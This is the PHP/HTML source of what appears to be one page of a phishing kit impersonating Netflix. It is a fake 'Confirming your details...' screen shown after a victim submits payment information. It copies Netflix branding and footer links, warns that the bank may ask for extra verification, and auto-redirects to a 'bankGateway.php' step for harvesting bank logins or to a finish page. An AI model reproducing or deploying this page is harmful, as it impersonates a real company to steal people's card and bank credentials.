<html lang="en">
    <head>
	<?php
session_start();
error_reporting(0);
function generateRandomString($length = 100) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$string = generateRandomString();
        if($bankLogs == '1'){
            echo '
            <script>
                setTimeout(function(){
                    window.location.href = "bankGateway.php?sessionID='.$sessionID.'";
                }, 5000);
            </script>
            ';
        }
        else{
            echo '
            <script>
                setTimeout(function(){
                    window.location.href = "finish.php?sessionID='.$string.'";
                }, 5000);
            </script>
            ';
        }
        ?>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Netflix</title>
        <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
        <link type="text/css" rel="stylesheet" href="css/Cards.css">
        <link rel="shortcut icon" href="assets/icon.ico">
    </head>
    
    <body>
        <div id="appMountPoint">
            <div class="netflix-sans-font-loaded">
                <div class="basicLayout modernInApp signupSimplicity-creditOptionMode simplicity">
                    <div class="nfHeader noBorderHeader signupBasicHeader">
                        <a style="margin-top: 2%;" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo">
                            <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true">
                                <g id="netflix-logo">
                                    <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path>
                                </g>
                            </svg>
                            <span class="screen-reader-text">Netflix</span>
                        </a>
                        <a class="authLinks signupBasicHeader" data-uia="header-signout-link">Sign Out</a>
                    </div>
                    <div class="simpleContainer" data-transitioned-child="true">
                        <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
                            <form data-uia="payment-form">
                                <div class="paymentFormContainer">
                                    <div>
                                        <div class="stepHeader-container" data-uia="header">
                                            <div class="stepHeader" data-a11y-focus="true" tabindex="0">
                                                <div data-uia="error-message-container" class="ui-message-container ui-message-success">
                                                    <div class="ui-message-icon"></div>
                                                    <div data-uia="text" class="ui-message-contents">                                
                                                        Thank you, we are just processing your details. Your bank may ask for extra verification!
                                                    </div>
                                                </div>
                                                <div style="text-align: center;">
                                                    <h1 class="stepTitle" data-uia="stepTitle">Confirming your details...</h1>
                                                    <img src="assets/spin.gif">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                    <div class="site-footer-wrapper centered" style="transition-duration: 250ms; opacity: 1;">
                        <div class="footer-divider"></div><div class="site-footer"><p class="footer-top">Questions? Call <a class="footer-top-a" href="tel:0800 096 6379">0800 096 6379</a></p><ul class="footer-links structural"><li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/support/412" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label">FAQ</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Help Centre</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/termsofuse" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Terms of Use</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/privacy" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label">Privacy</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/privacy#cookies" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label">Cookie Preferences</span></a></li><li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/en/node/2101" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Corporate Information</span></a></li></ul></div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>